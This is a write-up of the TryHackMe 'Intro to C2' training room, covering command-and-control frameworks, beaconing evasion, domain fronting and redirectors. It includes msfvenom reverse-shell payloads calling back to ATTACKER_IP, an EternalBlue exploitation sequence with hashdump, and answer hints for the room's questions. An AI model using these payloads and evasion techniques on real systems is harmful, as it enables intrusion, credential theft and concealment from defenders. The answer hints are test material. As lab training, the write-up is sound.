## `VIP` [Intro to C2](https://tryhackme.com/jr/introtoc2)
> Learn the essentials of Command and Control to help you become a better Red Teamer and simplify your next Red Team assessment!
- [x] [Task 1  Introduction](#task-1--introduction)
- [x] [Task 2  Command and Control Framework Structure](#task-2--command-and-control-framework-structure)
- [x] [Task 3  Common C2 Frameworks](#task-3--common-c2-frameworks) [`C2Matrix`](https://docs.google.com/spreadsheets/d/19IjBcl_zuRm-N5D2b9f3Gtk7eh3yCdYC_yGnIHkec7k/edit?usp=sharing)
- [x] [Task 4  Setting Up a C2 Framework](#task-4--setting-up-a-c2-framework)
- [x] [Task 5  C2 Operation Basics](#task-5--c2-operation-basics)
- [x] [Task 6  Command, Control, and Conquer](#task-6--command-control-and-conquer)
- [x] [Task 7  Advanced C2 Setups](#task-7--advanced-c2-setups)
- [x] [Task 8  Wrapping Up](#task-8--wrapping-up)

---
- (`C2`) - Command and Control 
---

# [Task 1  Introduction]()

### Welcome to Intro to C2 
- Command and Control (C2) Frameworks are an essential part of both Red Teamers and Advanced Adversaries playbooks. 
- They make it both easy to manage compromised devices during an engagement and often help aid in lateral movement.

### Room Objectives
#### In this room, we will learn about Command and Control Frameworks in-depth to gain a better understanding of the following topics:
- How a Command and Control Framework operates
- The various components that you may use.
- How to set up a basic Command and Control Framework
- Use Armitage or Metasploit to gain familiarity with a Command and Control Framework
- How to administer a Command and Control Framework
- OPSEC Considerations while administering a Command and Control Framework
- And much more!

### Room Prerequisites
- General experience with the Metasploit Framework, for more information, see the Metasploit Module.
- General familiarity with Red Teaming; for more information, see the Red Team Fundamentals room.
- General familiarity with exploiting vulnerable virtual machines.


---

# [Task 2  Command and Control Framework Structure]()

### What is a Command and Control Framework
- While trying to digest the various components of a C2 framework, it may be intimidating. However, they donâ€™t have to be. 
- In order to better understand what a C2 framework is at its most basic level, think of a Netcat listener (the C2 server) that is capable of handling many reverse shells calling back at once (C2 Agents). 
- Itâ€™s a server but for reverse shells. 
- Unlike Netcat, almost all C2 frameworks require a special payload generator. 
- This is usually a feature that is built into the framework itself. 
- For example, Metasploit is a C2 Framework that has its own payload generator, MSFVenom.
  > - ![image](https://user-images.githubusercontent.com/51442719/180596060-ab80790f-b897-48a9-bbe6-e68c5a8aa5ff.png)
  > - *The Diagram above depicts three compromised clients calling back to a C2 Server*.
- So what exactly makes C2 frameworks better than a normal Netcat listener? 
- It seems like all someone needs to do is implement session management into Netcat, and you have the same thing? 
- While this is true, C2 frameworks shine in their â€œPost Exploitationâ€ features.

### Command and Control Structure
#### C2 Server
- In order to understand a Command and Control framework, we must first start by understanding the various components of a C2 server. 
- Letâ€™s start with the most essential component - The C2 Server itself. 
- The C2 Server serves as a hub for agents to call back to. 
- Agents will periodically reach out to the C2 server and wait for the operatorâ€™s commands.
  > - ![image](https://user-images.githubusercontent.com/51442719/180596208-0f6a1ff6-634e-428a-a900-4e3bacfe3b3c.png)
  > - *This screenshot depicts a basic C2 server diagram*.

#### Agents / Payloads
- An agent is a program generated by the C2 framework that calls back to a listener on a C2 server. 
- Most of the time, this agent enables special functionality compared to a standard reverse shell. 
- Most C2 Frameworks implement pseudo commands to make the C2 Operatorâ€™s life easier. 
- Some examples of this may be a pseudo command to Download or Upload a file onto the system. 
- Itâ€™s important to know that agents can be highly configurable, with adjustments on the timing of how often C2 Agents beacon out to a Listener on a C2 Server and much more.

#### Listeners
- On the most basic level, a listener is an application running on the C2 server that waits for a callback over a specific port or protocol.
- Some examples of this are DNS, HTTP, and or HTTPS.

#### Beacons
- A Beacon is the process of a C2 Agent calling back to the listener running on a C2 Server.

### Obfuscating Agent Callbacks
#### Sleep Timers
- One key thing that some security analysts, anti-virus, and next-generation firewalls look for when attempting to identify Command and Control traffic is beaconing and the rate at which a device beacons out to a C2 server. 
- Letâ€™s say a firewall observed traffic that looks like so
  - TCP/443 - Session Duration 3s, 55 packets sent, 10:00:05.000
  - TCP/443 - Session Duration 2s, 33 packets sent, 10:00:10.000
  - TCP/443 - Session Duration 3s, 55 packets sent, 10:00:15.000
  - TCP/443 - Session Duration 1s, 33 packets sent, 10:00:20.000
  - TCP/443 - Session Duration 3s, 55 packets sent, 10:00:25.000
- A pattern is starting to form. 
- The agent beacons out every 5 seconds; this means that it has a sleep timer of 5 seconds.

#### Jitter

- Jitter takes the sleep timer and adds some variation to it; our C2 beaconing may now exhibit a strange pattern that may show activity that is closer to an average user:
  - TCP/443 - Session Duration 3s, 55 packets sent, 10:00:03.580
  - TCP/443 - Session Duration 2s, 33 packets sent, 10:00:13.213
  - TCP/443 - Session Duration 3s, 55 packets sent, 10:00:14.912
  - TCP/443 - Session Duration 1s, 33 packets sent, 10:00:23.444
  - TCP/443 - Session Duration 3s, 55 packets sent, 10:00:27.182
- The beaconing is now set at a semi-irregular pattern that makes it slightly more difficult to identify among regular user traffic. 
- In more advanced C2 frameworks, it may be possible to alter various other parameters, like â€œFileâ€ jitter or adding junk data to the payload or files being transmitted to make it seem larger than it actually is.
> Sample Python3 code for Jitter may look like so:
```python
import random
sleep = 60
jitter = random.randint(-30,30)
sleep = sleep + jitter
```
- It's important to note that this is a fundamental example,  but it can be much more math-heavy, setting upper bounds and lower bounds, taking percentages of last sleep, and building on from there. 
- Because this is an introduction room, we will spare you a complicated formula.

### Payload Types
- Much like a regular Reverse Shell, there are two primary types of payloads that you may be able to use in your C2 Framework; Staged and Stageless payloads.

#### Stageless Payloads
- Stageless Payloads are the simplest of the two; they contain the full C2 agent and will call back to the C2 server and begin beaconing immediately. 
- You can refer to the diagram below to gain a better understanding of how Stageless payloads operate.
  > - ![image](https://user-images.githubusercontent.com/51442719/180596455-9a59abc4-bf61-4fc8-8243-c1d04d701024.png)
  > - *This screenshot depicts a stageless payload calling back to a C2 server*
- The steps for establishing C2 beaconing with a Stageless payload are as follows:
  - 1. The Victim downloads and executes the Dropper
  - 2. The beaconing to the C2 Server begins

#### Staged Payloads
- Staged payloads require a callback to the C2 server to download additional parts of the C2 agent. 
- This is commonly referred to as a â€œDropperâ€ because it is â€œDroppedâ€ onto the victim machine to download the second stage of our staged payload. 
- This is a preferred method over stageless payloads because a small amount of code needs to be written to retrieve the additional parts of the C2 agent from the C2 server. 
- It also makes it easier to obfuscate code to bypass Anti-Virus programs.
  > - ![image](https://user-images.githubusercontent.com/51442719/180596564-57d52069-86e3-4a98-ac9e-cffa61bff4a7.png)
  > - *This diagram depicts a dropper calling back to a C2 server for its second stage*.
- The steps for establishing C2 beaconing with a Staged payload are as follows:
  - 1. The Victim downloads and executes the Dropper
  - 2. The Dropper calls back to the C2 Server for Stage 2
  - 3. The C2 Server sends Stage 2 back to the Victim Workstation
  - 4. Stage 2 is loaded into memory on the Victim Workstation 
  - 5. C2 Beaconing Initializes, and the Red Teamer/Threat Actors can engage with the Victim on the C2 Server.

### Payload Formats
- As you may know, Windows PE files (Executables) are not the only way to execute code on a system. 
- Some C2 Frameworks support payloads in various other formats, for example:
  - PowerShell Scripts
    - Which may contain C# Code and may be compiled and executed with the Add-Type commandlet
  - HTA Files
  - JScript Files
  - Visual Basic Application/Scripts
  - Microsoft Office Documents
- and many more. 
- For more information on various other payload formats, you should review the [`Weaponization`](https://tryhackme.com/room/weaponization) room in the Initial Access module.

### Modules
- Modules are a core component of any C2 Framework; they add the ability to make agents and the C2 server more flexible. 
- Depending on the C2 Framework, scripts must be written in different languages. 
- Cobalt Strike has â€œAggressor Scriptsâ€, which are written in the â€œAggressor Scripting Languageâ€. 
- PowerShell Empire has support for multiple languages, Metasploitâ€™s Modules are written in Ruby, and many others are written in many other languages.

#### Post Exploitation Modules
- Post Exploitation modules are simply modules that deal with anything after the initial point of compromise, this could be as simple as running SharpHound.ps1 to find paths of lateral movement, or it could be as complex as dumping LSASS and parsing credentials in memory. 
- For more information on Post Exploitation, refer to the [`Post Exploitation Basics`](https://tryhackme.com/room/postexploit) room.

#### Pivoting Modules
- One of the last major components of a C2 Framework is its pivoting modules, making it easier to access restricted network segments within the C2 Framework. 
- If you have Administrative Access on a system, you may be able to open up an â€œSMB Beaconâ€, which can enable a machine to act as a proxy via the SMB protocol. 
- This may allow machines in a restricted network segment to communicate with your C2 server.
  > - ![image](https://user-images.githubusercontent.com/51442719/180596720-80f806ec-00f7-4671-a85f-51d627d7315b.png)
  > - *This diagram depicts multiple victims with an SMB pivot calling back to a C2 server*.
- The diagram above shows how hosts within a restricted network segment call back to the C2 Server:
  - 1. The Victims call back to an SMB named pipe on another Victim in a non-restricted network segment.
  - 2. The Victim in the non-restricted network segment calls back to the C2 Server over a standard beacon.
  - 3. The C2 Server then sends commands back to the Victim in the non-restricted network segment.
  - 4. The Victim in the non-restricted network segment then forwards the C2 instructions to the hosts in the restricted segment.

### Facing the world 
- One important obstacle that all Red Teamers must overcome is placing infrastructure in plain view. 
- There are many different methods to do this; one of the most popular methods is called "`Domain Fronting`".

#### Domain Fronting
- Domain Fronting utilizes a known, good host (for example) Cloudflare. 
- Cloudflare runs a business that provides enhanced metrics on HTTP connection details as well as caching HTTP connection requests to save bandwidth.  
- Red Teamers can abuse this to make it appear that a workstation or server is communicating with a known, trusted IP Address. 
- Geolocation results will show wherever the nearest Cloudflare server is, and the IP Address will show as ownership to Cloudflare.
  > - ![image](https://user-images.githubusercontent.com/51442719/180596878-c47972b4-0fb9-4f59-a7c0-ae2047e443d2.png)
  > - *This diagram shows an example HTTP beacon from a compromised device*.
- The diagram above depicts how Domain Fronting works:
  - 1. The C2 Operator has a domain that proxies all requests through Cloudflare. 
  - 2. The Victim beacons out to the C2 Domain.
  - 3. Cloudflare proxies the request, then looks at the Host header and relays the traffic to the correct server.
  - 4. The C2 Server then responds to Cloudflare with the C2 Commands.
  - 5. The Victim then receives the command from Cloudflare.  
  
#### C2 Profiles
- The next technique goes by several names by several different products, "NGINX Reverse Proxy", "Apache Mod_Proxy/Mod_Rewrite",  "Malleable HTTP C2 Profiles", and many others. 
- However, they are all more or less the same. 
- All of the Proxy features more or less allow a user to control specific elements of the incoming HTTP request. 
- Let's say an incoming connection request has an "X-C2-Server" header; we could explicitly extract this header using the specific technology that is at your disposal (Reverse Proxy, Mod_Proxy/Rewrite, Malleable C2 Profile, etc.) and ensure that your C2 server responds with C2 based responses. 
- Whereas if a normal user queried the HTTP Server, they might see a generic webpage. 
- This is all dependent on your configuration.
  > - ![image](https://user-images.githubusercontent.com/51442719/180597036-e5a8eb13-b4a1-41bc-a900-dfdd5ab0acee.png)
  > - *A Compromised Device and Security Analyst reach out to a C2 server, only the Compromised device gets a C2 Beacon back - the Analyst gets Cloudflare's website back*.
- The diagram above depicts how C2 profiles work:
  - 1. The Victim beacons out to the C2 Server with a custom header in the HTTP request, while a SOC Analyst has a normal HTTP Request
  - 2. The requests are proxied through Cloudflare
  - 3. The C2 Server receives the request and looks for the custom header, and then evaluates how to respond based on the C2 Profile.
  - 4. The C2 Server responds to the client and responds to the Analyst/Compromised device.
- Because HTTPS requests are encrypted, extracting specific headers (ex: X-C2-Server, or Host) may be impossible. 
- By using C2 Profiles, we may be able to hide our C2 server from the prying eyes of a Security Analyst. 
- For more information on how C2 profiles can be powerful, see this blog post on [`Understanding Malleable C2 Profiles for Cobalt Strike`](https://blog.zsec.uk/cobalt-strike-profiles/).
- In task 7, we will explain and explore another technique called "Redirectors". 
- We will gain hands-on experience configuring Metasploit and Apache 2 to demonstrate how a redirector is set up.

### Answer the questions below
- What is the component's name that lives on the victim machine that calls back to the C2 server?
  > [`*****`](#Agent)
- What is the beaconing option that introduces a random delay value to the sleep timer?
  > [`******`](#Jitter)
- What is the term for the first portion of a Staged payload?
  > [`*******`](#Dropper)
- What is the name of the communication method that can potentially allow access to a restricted network segment that communicates via TCP ports 139 and 445?
  > [`*** ******`](#SMB-Beacon)


---

# [Task 3  Common C2 Frameworks]()

### Common C2 Frameworks
- Throughout your journey, you may encounter many different C2 Frameworks; we will discuss a few popular C2 Frameworks that are widely used by Red Teamers and Adversaries alike. 
- We will be dividing this into two sections:
  - Free
  - Premium/Paid
- You may ask some questions like â€œWhy would I use a premium or paid C2 framework?â€, and this is an excellent question. 
- Premium/Paid C2 frameworks usually are less likely to be detected by Anti-Virus vendors. 
- This is not to say that it's impossible to be detected, just that open-source C2 projects are generally well understood, and signatures can be easily be developed.
- Usually, premium C2 frameworks generally have more advanced post-exploitation modules, pivoting features, and even feature requests that open-source software developers may sometimes not fulfill. 
- For example, one feature Cobalt Strike offers that most other C2 frameworks do not is the ability to open a VPN tunnel from a beacon. 
- This can be a fantastic feature if a Proxy does not work well in your specific situation. 
- You must do your research to find out what will work best for your team.

### Free C2 Frameworks
#### Metasploit
- The [`Metasploit Framework`](https://www.metasploit.com/), developed and maintained by [`Rapid7`](https://github.com/rapid7), is one of the most popular Exploitation and Post Exploitation frameworks (C2) that is publicly available and is installed on most penetration testing distributions.
```cmd
root@kali$ msfconsole
```                                                  
```cmd
       =[ metasploit v6.1.12-dev                          ]
+ -- --=[ 2177 exploits - 1152 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

msf6 > 
```
### Armitage 
- Armitage is an extension of the Metasploit Framework - it adds a Graphical user interface and is written in Java, and is incredibly similar to Cobalt Strike. 
- This is because they were both developed by Raphael Mudge. 
- Armitage offers an easy way to enumerate and visualize all of your targets. 
- Aside from looking a lot like Cobalt Strike, it even offers some unique features. 
- One of the most popular can be found in the â€œAttacksâ€ menu; 
  - This feature is known as the Hail Mary attack, which attempts to run all exploits for the services running on a specific workstation. 
- Armitage really is â€œFast and Easy Hackingâ€.
  > ![image](https://user-images.githubusercontent.com/51442719/180626371-c5f8a8a2-8e38-4118-9808-73dabf71d3f9.png)
  > - *A Screenshot of the Armitage UI*

### Powershell Empire/Starkiller
- [`Powershell Empire`](https://bc-security.gitbook.io/empire-wiki/) and [`Starkiller`](https://github.com/BC-SECURITY/Starkiller) is another incredibly popular C2 originally created by Harmjoy, Sixdub, and Enigma0x3 from Veris Group. 
- Currently, the project has been discontinued and has been picked up by the BC Security team (Cx01N, Hubbl3, and _Vinnybod). 
- Empire features agents written in various languages compatible with multiple platforms, making it an incredibly versatile C2. 
- For more information on Empire, we recommend you take a look at the [`Powershell Empire room`](https://tryhackme.com/room/rppsempire).
  > ![image](https://user-images.githubusercontent.com/51442719/180626403-1ead1c39-2e6a-4d92-aac0-f5377ccc80bc.png)
  > - *A Screenshot of the Starkiller UI*

### Covenant
- [`Covenant`](https://github.com/cobbr/Covenant) by Ryan Cobb is the last free C2 Framework we will be covering - By far, it is one of the most unique C2 Frameworks being written in C#. 
- Unlike Metasploit/Armitage, Itâ€™s primarily used for post-exploitation and lateral movement with HTTP, HTTPS, and SMB listeners with highly customizable agents.
  > ![image](https://user-images.githubusercontent.com/51442719/180626427-1eacd5f7-b962-4a19-995c-211e56ac7788.png)
  > - *A Screenshot of the Covenant UI*

### Sliver
- [`Sliver`](https://github.com/BishopFox/sliver) by [`Bishop Fox`](https://bishopfox.com/) is an advanced, highly customizable multi-user, CLI-based C2 framework. 
- Sliver is written in Go, which makes reverse engineering the C2 "implants" incredibly difficult. 
- It supports various protocols for C2 communications like WireGuard, mTLS, HTTP(S), DNS, and much more. 
- Additionally, it supports BOF files for additional functionality, DNS Canary Domains for masking C2 communications, automatic Let's Encrypt certificate generation for HTTPS beacons, and much more.  
  > ![image](https://user-images.githubusercontent.com/51442719/180626477-a67d0391-4f4b-4e2e-910a-ad5250716ec5.png)
  > - *A Screenshot of the Sliver UI*

---

# [Task 4  Setting Up a C2 Framework]()

# Let's Setup a C2 Server
- In order to gain a better understanding of what is required to set up and administer a C2 server, we will be using Armitage. 
- As a reminder, Armitage is a GUI for the Metasploit Framework, and because of this, it has almost all aspects of a standard C2 framework.
> ðŸ’¡ Note: In case you're using the AttackBox, you may skip to the Preparing our Environment section.
- Setting Up Armitage
- Downloading, Building, and Installing Armitage
- First, we must clone the repository from Gitlab:
```
git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage && bash package.sh
```


---

# [Task 5  C2 Operation Basics]()

### Accessing and Managing your C2 Infrastructure
- Now that we have a general idea of how to set up a C2 Server, we will go over some basic operational details that you should know when accessing your C2 Server. 
- It's important to note that you are not required to perform any actions in this task - This is meant to gain general experience and familiarity with Command and Control Frameworks.

#### Basic Operational Security
- We briefly touched on this in the last section; You should never have your C2 management interface directly accessible. 
- This is primarily for you to improve operational security. 
- It can be incredibly easy to fingerprint C2 servers. 
- For example, in versions prior to 3.13, Cobalt Strike C2 servers were able to be identified by an extra space (\x20) at the end of the HTTP Response.
- Using this tactic, many Blue Teamers could fingerprint all of the Cobalt Strike C2 servers publicly accessible. 
- For more information on fingerprinting and identifying Cobalt Strike C2 Servers, check out this posted on the [`Recorded Future blog`](https://www.recordedfuture.com/cobalt-strike-servers/).

#### Accessing your Remote C2 Server that's Listening Locally
- This section will be focusing on how to securely access your C2 server by SSH port-forwarding; if you have port-forwarded with SSH before, feel free to skip over this section, you may not learn anything new. 
- For those unfamiliar, SSH port-forwarding allows us to either host resources on a remote machine by forwarding a local port to the remote server, or allows us to access local resources on the remote machine we are connecting to.  
- In some circumstances, this may be for circumventing Firewalls.
  > ![image](https://user-images.githubusercontent.com/51442719/180645878-0139fd08-0fc1-40b3-8d44-a62f8923f462.png)
  - Or, in our instance, this could be done for operational security reasons.
  > ![image](https://user-images.githubusercontent.com/51442719/180645900-94a608d8-c090-4768-9c71-0558a7f58f96.png)
  > - *Firewall Allows TCP/22, allowing us to access TCP/8080 over TCP/22*
- Now that we have a better understanding of why we want to SSH port forward, let's go over the how.
- In our C2 set up from Task 4, our Teamserver is listening on localhost on TCP/55553. 
- In order to access Remote port 55553, we must set up a Local port-forward to forward our local port to the remote Teamserver server. 
- We can do this with the -L flag on our SSH client:
```cmd
ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
```
- Now that we have an SSH remote port forward set up, you can now connect to your C2 server running on TCP/55553. 
- As a reminder, Armitage does not support listening on a loopback interface (127.0.0.1-127.255.255.255), so this is general C2 server admin advice. 
- You will find this advice more centric to C2 servers like `Covenant`, `Empire`, and many others.
- We highly recommend putting firewall rules in place for C2 servers that must listen on a public interface so only the intended users can access your C2 server. 
- There are various ways to do this. 
- If you are hosting Cloud infrastructure, you can set up a Security Group or use a host-based firewall solution like `UFW` or `IPTables`.

#### Creating a Listener in Armitage
- Next, we're going to move onto a topic that all C2 servers have - this being listener creation. 
- To stay on topic, we will demonstrate how to set up a basic listener with Armitage then explore some of the other theoretical listeners you may encounter in various other C2 Frameworks. 
- Let's create a basic Meterpreter Listener running on TCP/31337. To start, click on the Armitage dropdown and go over to the "Listeners" section; you should see three options, Bind, Reverse, and set LHOST. 
- Bind refers to Bind Shells; you must connect to these hosts. 
- Reverse refers to standard Reverse Shells; this is the option we will be using.
  > ![image](https://user-images.githubusercontent.com/51442719/180646140-40ae4b3d-20ce-4ad1-baf8-843c5524fa9f.png) 
  > - *Creating a Listener in Armitage*
- After clicking "Reverse," a new menu will open up, prompting you to configure some basic details about the listener, specifically what port you want to listen on and what listener type you would like to select. 
- There are two options you can choose from, "Shell" or "Meterpreter". 
- Shell refers to a standard netcat-style reverse shell, and Meterpreter is the standard Meterpreter reverse shell.
  > ![image](https://user-images.githubusercontent.com/51442719/180646172-865bbb36-c7db-47a4-ac51-3d67cb125839.png)
  > - *Configuring the Listener*
- After pressing enter, a new pane will open up, confirming that your listener has been created. 
- This should look like the standard Metasploit exploit/multi/handler module.
  > ![image](https://user-images.githubusercontent.com/51442719/180646181-6cbe2640-e5bf-48e9-bfb6-91e81a77ca5b.png)
  > - *Listener successfully configured*
- After setting up a listener, you can generate a standard windows/meterpreter/reverse_tcp reverse shell using MSFvenom and set the LHOST to the Armitage server to receive callbacks to our Armitage server. 

#### Getting a Callback
```cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe
```
- After generating the windows/meterpreter/reverse_tcp using MSFVenom, we can transfer the payload to a target machine and execute it. 
- After a moment or two, you should receive a callback from the machine.
  > ![image](https://user-images.githubusercontent.com/51442719/180646213-7d8d87e5-81e5-46b0-b7cc-a57216c1302e.png)
  > - *Callback from the Victim*


### Listener Type
- As previously mentioned, standard reverse shell listeners are not the only ones that exist; there are many varieties that use many different protocols; however, there are a few common ones that we will cover, these being the following:
#### Standard Listener 
   - These often communicate directly over a raw TCP or UDP socket, sending commands in cleartext. 
   - Metasploit has full support for generic listeners.
#### HTTP/HTTPS Listeners 
   - These often front as some sort of Web Server and use techniques like Domain Fronting or Malleable C2 profiles to mask a C2 server. 
   - When specifically communicating over HTTPS, it's less likely for communications to be blocked by an NGFW. 
   - Metasploit has full support for HTTP/HTTPS listeners.
#### DNS Listener 
   - DNS Listeners are a popular technique specifically used in the exfiltration stage where additional infrastructure is normally required to be set up, or at the very least, a Domain Name must be purchased and registered, and a public NS server must be configured. 
   - It is possible to set up DNS C2 operations in Metasploit with the help of additional tools. 
   - For more information, see this "[`Meterpreter over DNS`](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf)" presentation by Alexey Sintsov and Maxim Andreyanov. 
   - These are often very useful for bypassing Network Proxies.
#### SMB Listener 
   - Communicating via SMB named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with multiple devices talking to each other and only one device reaching back out over a more common protocol like HTTP/HTTPS. 
   - Metasploit has support for Named Pipes.

### Answer the questions below
- Which listener should you choose if you have a device that cannot easily access the internet?
  > Answer format: [`***`](#DNS)
- Which listener should you choose if you're accessing a restricted network segment?
  > Answer format: [`***`](#SMB)
- Which listener should you choose if you are dealing with a Firewall that does protocol inspection?
  > Answer format: [`*****`](#HTTPS)



---

# [Task 6  Command, Control, and Conquer]()

### Sample Exploit
#### Host Enumeration with Armitage
- Before letting you go off on your own, we're going to demonstrate how to exploit a sample Virtual Machine. 
- First, we will execute a port scan within Armitage by going to the "Hosts" section, hovering over "Nmap Scan", and selecting "Quick Scan".
  > ![image](https://user-images.githubusercontent.com/51442719/180647296-111e71b0-d80e-4599-b601-2a88b52fe818.png)
  > - *Armitage submenu of Hosts -> Nmap Scan -> Quick Scan*
- After selecting "Quick scan", a new option will pop up; this will prompt you to enter the IP Address range you would like to scan. You should enter the IP Address of the deployed Virtual machine in this box. 
  > ![image](https://user-images.githubusercontent.com/51442719/180647325-ac44411e-25d0-4bba-8ec5-70e624a6001f.png)
  > - *Input menu of "Enter Scan Range" with the IP Address VICTIM_MACHINE*
- After pressing "Ok", and waiting a moment or two, you should see a new tab open up called "nmap" and a new machine display in the "Workspace" window. 
- In the "nmap" tab, you will see the raw scan results.
  > ![image](https://user-images.githubusercontent.com/51442719/180647356-654debfc-17eb-45b3-a4a4-08c733b8f7b5.png)
  > - *Results from the Nmap port-scan*
- Now that you have learned how to execute a basic port scan, try to execute various other scans against the target and see what additional information you may retrieve from a host.
> ðŸ’¡ `Hint`: A Comprehensive Scan will grab banners, enumerate software versions, enumerate OS versions, and much more!
 
#### Exploitation with Armitage
- Next up, we're going to show off exploitation with Armitage; our victim in our example is a Windows 7 machine (more specifically, Blue). 
- This machine is vulnerable to the classic exploit "Eternal  Blue".  
- To find this, we will focus on the far right tab with folders, we will expand the "Exploit" dropdown, then find the "Windows" dropdown, then the "SMB" dropdown, then you will see all of the exploits.
  > ![image](https://user-images.githubusercontent.com/51442719/180647696-ce498520-5127-437a-8414-a94868da492c.png)
  > - *Listing all the exploits within Armitage*
- Next up, you can double click your exploit of choice, or drag and drop the exploit onto the host, and a new window will open up. 
- Clicking "launch" will fire off the exploit. 
  > ![image](https://user-images.githubusercontent.com/51442719/180647710-d145af13-a9f4-49ae-bd4f-ae13e69f377e.png)
  > - *Eternal Blue Exploit  Module Information*
- After clicking "Launch", you will notice a new "Exploit" tab open up. 
- Armitage will run all of the regular checks that Metasploit normally does. 
- In the case of Eternal Blue, it ran the standard check script followed by the exploit script until it got a successful shell. 
- It's worth noting that by default in this Exploit, it chose a Bind shell.
- Make sure you fully read the exploit information and options to see if a Bind Shell or a Reverse Shell is an option.
  >![image](https://user-images.githubusercontent.com/51442719/180647719-c1ac52a1-f3db-457d-a3c8-1e22c0c15624.png)
  > - *A Successful Exploitation Attempt from Armitage*
- After you receive your shell, right-click on the host and select "Interact". 
- This will open a standard shell you're familiar with. 
- In order to get a Meterpreter shell, we recommend that you run the multi/manage/shell_to_meterpreter module.
  > ![image](https://user-images.githubusercontent.com/51442719/180647730-46e02489-6ea5-4bbe-8a0a-fb05dd15d08f.png)
  > - *Compromised Host in Armitage*

### Practice Time
- Now that you have learned how to exploit hosts using Armitage, you will now get to practice your skills by hacking the virtual machine by using Metasploit and Armitage. 
- There are multiple exploit paths that you may be able to follow. 
- We encourage you to explore the various exploit paths you may be able to find in order to gain a better understanding of exploitation and post-exploitation modules in Metasploit and Armitage. 
- As a reminder, Armitage is just Metasploit with a GUI; all the same exploits exist and are categorized the same way.

<details>
  <summary>

# `Need Some Help? Click here!`

  </summary>

- If you are having difficulties with compromising the machine, here's a step-by-step guide to compromise the VM with Metasploit. 
- If you would like to use Armitage, use this [`guide that shows step-by-step`](https://drive.google.com/file/d/1u-YmWl7cx3tO2vVjon0EtOGLXVCak2SJ/view?usp=sharing) instructions. 
- Now onto Metasploit!  

#### Our first step is to launch Metasploit:
```cmd
msfconsole -q
```
```cmd
use exploit/windows/smb/ms17_010_eternalblue
```
```cmd
set LHOST eth0
```
```cmd
set RHOST VICTIM_IP
```
```cmd
run
```

- Now that we have exploited the Virtual Machine and have achieved System level access, we can use the hashdump command to retrieve the users NTLM hashes:
```cmd
hashdump
```
- All that is left is to now retrieve the flags in the user's Home folders:
```cmd
cat C:/Users/Administrator/Desktop/root.txt
```
- And that's all there is to it! You have successfully compromised Ted's PC.
```cmd
hashdump
```
  
</details>
  
### Answer the questions below
- What flag can be found after gaining Administrative access to the PC?
  > Answer format: [`***{********************************}`]()
- What is the Administrator's NTLM hash?
  > Answer format: [`********************************`]()
- What flag can be found after gaining access to Ted's user account?
  > Answer format: [`***{********************************}`]()
- What is Ted's NTLM Hash?
  > Answer format: [`********************************`]()


---

# [Task 7  Advanced C2 Setups]()

### There's Always Room for Improvement
- As you may have guessed, Metasploit itself is not that great of a C2 server for advanced adversary operations. 
- It's not as flexible as one would desire; you cannot configure agents to beacon out every X seconds with Y jitter. 
- A Next-Generation Firewall could quickly pick up on this C2 traffic, seeing it's a constant stream of traffic. 
- In addition, anyone could connect to an HTTP/HTTPS listener and find out relatively quickly what is going on.

### Command and Control Redirectors 
#### What is a Redirector?
- Before we dive into configuring a Redirector, first, what is it? A Redirector is exactly as it sounds. 
- It's a server that "Redirects" HTTP/HTTPS requests based on information within the HTTP Request body. 
- In production systems, you may see a "Redirector" in the form of a Load Balancer. 
- This server often runs Apache 2 or NGINX. For this lab, we will be leveraging Apache and some of its modules to build a Redirector.
- Jumping back into Metasploit, we can set up some basic configurations on Metasploit to allow for more advanced configurations, in this task; we will be setting up a Redirector. 
- Usually, this configuration is set up on multiple hosts; the purpose of this is to hide the true Command and Control server. 
- The diagram below illustrates how communications between a victim and a C2 server happen.
  > ![image](https://user-images.githubusercontent.com/51442719/180653538-e10b6e5f-cff4-4a87-9019-b9fb2f182efb.png)
  > - *Illustration of a C2 and Redirector with victims calling back*
- Usually, when you have a C2 callback, you may set the callback host to a Domain, let's say admin.tryhackme.com. 
- It's very common for your C2 Server to get reported, when a user files a complaint. 
- Usually, the server gets taken down fairly quickly. 
- It can sometimes be as little as 3 hours and as much as 24. 
- Setting up a redirector ensures that any information you may have collected during the engagement is safe and sound. 
- But how does this stop the C2 Server from being taken down? Surely if someone fingerprinted Cobalt Strike on your C2 Server, someone would file a complaint, and it would get taken down. 
- This is true, so you should set up a Firewall to only allow communication to and from your redirector(s) to mitigate any potential risks.
  > ![image](https://user-images.githubusercontent.com/51442719/180653615-368520da-1308-4396-9bf6-36f0d3938607.png)
  > - *Illustration of how a C2 Server and a Redirector should interact*

#### How is a Redirector Setup?
- Before we dive into configuring a redirector, we must first understand how one is set up; we will be aligning this to the tools we have available, which are Metasploit and Apache2. 
- In Apache, we will be leveraging a module called "mod_rewrite" (or the Rewrite module). 
- This module allows us to write rules to forward requests to internal or external hosts on a server based on specific HTTP headers or content. 
- We will need to use several modules to configure our Redirector. 
- The following modules must be enabled:
  - rewrite
  - proxy
  - proxy_http
  - headers
> ðŸ’¡ `Note`: If you are using the Attack Box, there is already a service running on port 80 - you must change the default port that Apache listens on in /etc/apache2/ports.conf. 
> - You must do this before starting the Apache 2 service, or it will fail to start.
- You can install apache 2 and enable it with the following commands:
```cmd
apt install apache2
```
```cmd
a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
```
- Using Meterpreter, we have the ability to configure various aspects of the HTTP Request, for example, the User-Agent. 
- It is very common for a threat actor to make a slight adjustment to the User-Agent in their C2 HTTP/HTTPS payloads. 
- It's in every HTTP request, and they all more or less look the same, and there is a very good chance a security analyst may overlook a modified user agent string. 
- For this demonstration, we will generate a Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect the HTTP request in Wireshark. 

#### Generating a Payload with Modified Headers 
```cmd
msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
```
- After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the `HTTP` filter to only view HTTP requests. 
- After it's started capturing packets, execute the binary on the victim system. 
- You will notice an HTTP request come in with our modified User-Agent.
